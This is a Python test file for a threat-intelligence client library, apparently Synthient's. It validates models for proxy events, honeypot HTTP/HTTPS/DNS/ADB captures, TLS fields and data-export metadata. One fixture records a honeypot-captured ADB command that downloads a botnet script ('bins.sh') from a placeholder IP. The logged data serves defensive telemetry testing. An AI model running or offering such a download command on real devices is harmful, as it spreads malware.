from __future__ import annotations

import json
from datetime import UTC, datetime

import pydantic
import pytest

from synthient import (
    Account,
    Export,
    ExportMeta,
    ExportPage,
    HeliosADBEvent,
    HeliosDNSEvent,
    HeliosHTTPEvent,
    HeliosHTTPSEvent,
    IPInfo,
    Network,
    ParquetSchema,
    ProxyEvent,
)
from tests.conftest import EXPORT, HELIOS_HTTPS, IP_INFO
from tests.test_account import ACCOUNT

HELIOS_ADB: dict[str, object] = {
    "session": "00075b3dde7ddb645347a137f01ac991",
    "sequential_id": 3,
    "command": "cd /data/local/tmp; wget http://198.51.100.7/bins.sh",
    "hash": "cd6d",
    "meta": {"proxy_ip": "203.0.113.10", "server": "hp-eu-1", "pool_id": "prod"},
}

TLS_FIELDS: dict[str, object] = {
    "complete": False,
    "truncated": True,
    "transport": "tcp",
    "record_version_code": 769,
    "handshake_version_code": 771,
    "supported_version_codes": [2570, 772, 771],
    "alpn_hex": ["6832", "687474702f312e31"],
    "signature_algorithms_cert": [{"code": 2052, "name": "rsa_pss_rsae_sha256"}],
    "record_size_limit": 16385,
    "max_fragment_length": 4,
}

WHOIS_FILE = {"format": "tar.gz", "size_bytes": 997234948, "checksum": "add0"}

WHOIS_META: dict[str, object] = {
    "id": "latest",
    "stream": "whois",
    "kind": "daily",
    "format": "tar.gz",
    "date": 1794873600,
    "rows": 6583438,
    "size": 997234948,
    "checksum": "add0",
    "created_at": 1794960929,
    "schema": {"fields": []},
    "formats": [WHOIS_FILE],
    "entities": [
        {
            "entity": "asns",
            "row_count": 123778,
            "size_bytes": 5442736,
            "checksum": "062f",
            "schema": {
                "fields": [
                    {"name": "asn", "type": "int64"},
                    {"name": "updated", "type": "timestamp"},
                ]
            },
        },
        {
            "entity": "contacts",
            "row_count": 6459660,
            "size_bytes": 205447373,
            "checksum": "cf61",
            "schema": {"fields": [{"name": "emails", "type": "list<string>"}]},
        },
    ],
}


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (0, datetime(1970, 1, 1, tzinfo=UTC)),
        (1778187600, datetime(2026, 5, 7, 21, tzinfo=UTC)),
        (253_402_300_799, datetime(9999, 12, 31, 23, 59, 59, tzinfo=UTC)),
        (1_000_000_000_000, datetime(2001, 9, 9, 1, 46, 40, tzinfo=UTC)),
        (1778200137487, datetime(2026, 5, 8, 0, 28, 57, 487000, tzinfo=UTC)),
    ],
)
def test_unix_timestamps(value: int, expected: datetime) -> None:
    assert ProxyEvent.model_validate_json(f'{{"timestamp": {value}}}').timestamp == expected


@pytest.mark.parametrize(
    "value", ["true", '"1778187600"', "1.5", "999999999999", "99999999999999999999"]
)
def test_invalid_timestamps(value: str) -> None:
    with pytest.raises(pydantic.ValidationError):
        ProxyEvent.model_validate_json(f'{{"timestamp": {value}}}')


@pytest.mark.parametrize(
    "body",
    [
        '{"asn": "15169", "isp": "x", "type": "y"}',
        '{"asn": 15169.0, "isp": "x", "type": "y"}',
        '{"asn": true, "isp": "x", "type": "y"}',
        '{"asn": 15169, "isp": null, "type": "y"}',
        '{"asn": 15169, "type": "y"}',
    ],
)
def test_malformed_known_fields_are_rejected(body: str) -> None:
    with pytest.raises(pydantic.ValidationError):
        Network.model_validate_json(body)


def test_unknown_fields_are_ignored() -> None:
    info = IPInfo.model_validate_json('{"ip": "8.8.8.8", "new_section": {"a": 1}}')
    assert "new_section" not in info.model_dump()


def test_models_are_frozen() -> None:
    event = ProxyEvent(ip="1.2.3.4")
    with pytest.raises(pydantic.ValidationError):
        event.ip = "5.6.7.8"  # pyright: ignore[reportAttributeAccessIssue]


def test_renamed_fields() -> None:
    page = ExportPage.model_validate({"stream": "proxies", "feeds": [EXPORT], "next_cursor": "c"})
    assert page.exports == [Export.model_validate(EXPORT)]
    meta = ExportMeta.model_validate_json(
        '{"id": "2026-05-03", "stream": "proxies", "kind": "daily", "format": "parquet",'
        ' "date": 1777766400, "rows": 3, "size": 9, "checksum": "ab", "created_at": 1777770000,'
        ' "schema": {"fields": [{"name": "ip", "type": "string"}]},'
        ' "formats": [{"format": "parquet", "size_bytes": 9, "checksum": "ab"}]}'
    )
    assert meta.parquet_schema.fields[0].name == "ip"
    assert meta.date == datetime(2026, 5, 3, tzinfo=UTC)
    assert meta.hour is None


@pytest.mark.parametrize(
    ("model", "body"),
    [
        (IPInfo, IP_INFO),
        (Export, EXPORT),
        (Account, ACCOUNT),
        (HeliosHTTPSEvent, HELIOS_HTTPS),
        (HeliosHTTPSEvent, {**HELIOS_HTTPS, "timestamp": 1778200137000, "details": None}),
    ],
)
def test_json_round_trip(model: type[pydantic.BaseModel], body: dict[str, object]) -> None:
    value = model.model_validate_json(json.dumps(body))
    assert model.model_validate_json(value.model_dump_json(by_alias=True)) == value
    assert model.model_validate(value.model_dump(mode="json", by_alias=True)) == value
    assert model.model_validate(json.loads(json.dumps(body))) == value


def test_helios_https_details() -> None:
    body = {**HELIOS_HTTPS, "details": {**HELIOS_HTTPS["details"], "new_field": 1}}
    event = HeliosHTTPSEvent.model_validate_json(json.dumps(body))
    assert event.details is not None
    assert event.details.sni == "example.com"
    assert event.details.cipher_suites is not None
    assert event.details.cipher_suites[0].name == "TLS_AES_128_GCM_SHA256"
    assert event.details.extensions is not None
    assert event.details.extensions[0].length == 16
    assert event.details.session_id is None
    assert event.raw is None


def test_helios_https_details_unparsed() -> None:
    event = HeliosHTTPSEvent.model_validate_json(json.dumps({**HELIOS_HTTPS, "details": None}))
    assert event.details is None
    with pytest.raises(pydantic.ValidationError):
        HeliosHTTPSEvent.model_validate_json(
            json.dumps({**HELIOS_HTTPS, "details": '{"sni": "example.com"}'})
        )


def test_helios_http_details() -> None:
    event = HeliosHTTPEvent.model_validate_json(
        '{"timestamp": 1778200137487, "tunnel_id": 7, "domain": "example.com", "port": 80,'
        ' "protocol": "http", "meta": {"proxy_ip": "203.0.113.1"}, "details":'
        ' {"method": "GET", "uri": "/", "version": "HTTP/1.1", "headers": {"Host": "x"}},'
        ' "raw": "R0VUIC8gSFRUUC8xLjENCg=="}'
    )
    assert event.details is not None
    assert event.details.headers == {"Host": "x"}
    assert event.meta.proxy_ip == "203.0.113.1"
    assert event.raw == "R0VUIC8gSFRUUC8xLjENCg=="


def test_helios_dns() -> None:
    event = HeliosDNSEvent.model_validate_json(
        '{"timestamp": 1778200137487, "tunnel_id": 42, "domain": "api.ipify.org", "port": 443,'
        ' "protocol": "dns", "meta": {"server": "hp-eu-1"}, "transport": "tcp"}'
    )
    assert event.protocol == "dns"
    assert event.transport == "tcp"
    assert event.domain == "api.ipify.org"
    assert event.timestamp == datetime(2026, 5, 8, 0, 28, 57, 487000, tzinfo=UTC)


@pytest.mark.parametrize(
    ("model", "body"),
    [
        (HeliosHTTPSEvent, {key: value for key, value in HELIOS_HTTPS.items() if key != "meta"}),
        (HeliosADBEvent, {"session": "00075b3d", "sequential_id": 3, "command": "id"}),
        (HeliosADBEvent, {key: value for key, value in HELIOS_ADB.items() if key != "meta"}),
        (
            HeliosHTTPSEvent,
            {key: value for key, value in HELIOS_HTTPS.items() if key != "transport"},
        ),
    ],
)
def test_helios_required_fields(model: type[pydantic.BaseModel], body: dict[str, object]) -> None:
    with pytest.raises(pydantic.ValidationError):
        model.model_validate_json(json.dumps(body))


def test_export_formats() -> None:
    export = Export.model_validate_json(
        json.dumps(
            {
                **EXPORT,
                "id": "2026-11-17",
                "kind": "daily",
                "hour": None,
                "download_path": "/api/v4/feeds/geolocation/export/2026-11-17",
                "formats": [
                    {"format": "parquet", "size_bytes": 466431938, "checksum": "9712"},
                    {"format": "csv", "size_bytes": 540196440, "checksum": "de74"},
                    {"format": "mmdb", "size_bytes": 1874587084, "checksum": "ae71"},
                ],
            }
        )
    )
    assert [file.format for file in export.formats] == ["parquet", "csv", "mmdb"]
    assert export.formats[2].size_bytes == 1874587084
    assert export.entities is None
    assert export.variant is None


def test_lite_export() -> None:
    export = Export.model_validate_json(json.dumps({**EXPORT, "variant": "lite"}))
    assert export.variant == "lite"


def test_whois_meta() -> None:
    meta = ExportMeta.model_validate_json(json.dumps(WHOIS_META))
    assert meta.format == "tar.gz"
    assert meta.parquet_schema.fields == []
    assert meta.entities is not None
    asns, contacts = meta.entities
    assert asns.entity == "asns"
    assert asns.row_count == 123778
    assert asns.parquet_schema is not None
    assert [column.type for column in asns.parquet_schema.fields] == ["int64", "timestamp"]
    assert contacts.parquet_schema is not None
    assert contacts.parquet_schema.fields[0].type == "list<string>"


@pytest.mark.parametrize("schema", [{"fields": None}, {}])
def test_empty_schema_fields(schema: dict[str, object]) -> None:
    meta = ExportMeta.model_validate_json(json.dumps({**WHOIS_META, "schema": schema}))
    assert meta.parquet_schema.fields == []


def test_export_entity_without_schema() -> None:
    entity = {"entity": "asns", "row_count": 1, "size_bytes": 2, "checksum": "ab"}
    export = Export.model_validate_json(json.dumps({**EXPORT, "entities": [entity]}))
    assert export.entities is not None
    assert export.entities[0].parquet_schema is None


@pytest.mark.parametrize("format", ["parquet", "csv", "mmdb", "tar.gz", "jsonl"])
def test_export_meta_formats(format: str) -> None:
    meta = ExportMeta.model_validate_json(
        json.dumps({**WHOIS_META, "format": format, "formats": [{**WHOIS_FILE, "format": format}]})
    )
    assert meta.format == format
    assert meta.formats[0].format == format


def test_unknown_whois_entity() -> None:
    entity = {"entity": "routes", "row_count": 1, "size_bytes": 2, "checksum": "ab"}
    meta = ExportMeta.model_validate_json(json.dumps({**WHOIS_META, "entities": [entity]}))
    assert meta.entities is not None
    assert meta.entities[0].entity == "routes"


@pytest.mark.parametrize("type", ["double", "int32", "date", "float", "timestamp", "list<string>"])
def test_dataset_column_types(type: str) -> None:
    schema = ParquetSchema.model_validate_json(
        json.dumps({"fields": [{"name": "c", "type": type}]})
    )
    assert schema.fields[0].type == type


def test_helios_adb_meta() -> None:
    event = HeliosADBEvent.model_validate_json(json.dumps(HELIOS_ADB))
    assert event.meta is not None
    assert event.meta.server == "hp-eu-1"
    assert event.meta.provider is None
    unattributed = HeliosADBEvent.model_validate_json(json.dumps({**HELIOS_ADB, "meta": None}))
    assert unattributed.meta is None


@pytest.mark.parametrize("transport", ["tcp", "udp", "quic", "sctp"])
def test_helios_transport(transport: str) -> None:
    https = HeliosHTTPSEvent.model_validate_json(
        json.dumps({**HELIOS_HTTPS, "transport": transport})
    )
    dns = HeliosDNSEvent.model_validate_json(
        json.dumps({**HELIOS_HTTPS, "protocol": "dns", "transport": transport})
    )
    assert https.transport == transport
    assert dns.transport == transport


def test_tls_client_hello_fields() -> None:
    body = {**HELIOS_HTTPS, "details": {**HELIOS_HTTPS["details"], **TLS_FIELDS}}
    details = HeliosHTTPSEvent.model_validate_json(json.dumps(body)).details
    assert details is not None
    assert details.complete is False
    assert details.truncated is True
    assert details.transport == "tcp"
    assert details.record_version_code == 769
    assert details.handshake_version_code == 771
    assert details.supported_version_codes == [2570, 772, 771]
    assert details.alpn_hex == ["6832", "687474702f312e31"]
    assert details.signature_algorithms_cert is not None
    assert details.signature_algorithms_cert[0].name == "rsa_pss_rsae_sha256"
    assert details.record_size_limit == 16385
    assert details.max_fragment_length == 4

    bare = HeliosHTTPSEvent.model_validate_json(json.dumps(HELIOS_HTTPS)).details
    assert bare is not None
    assert all(getattr(bare, name) is None for name in TLS_FIELDS)


def test_helios_tunnel_id_beyond_int64() -> None:
    body = {**HELIOS_HTTPS, "tunnel_id": 17257744507466107949}
    assert HeliosHTTPSEvent.model_validate_json(json.dumps(body)).tunnel_id == 17257744507466107949
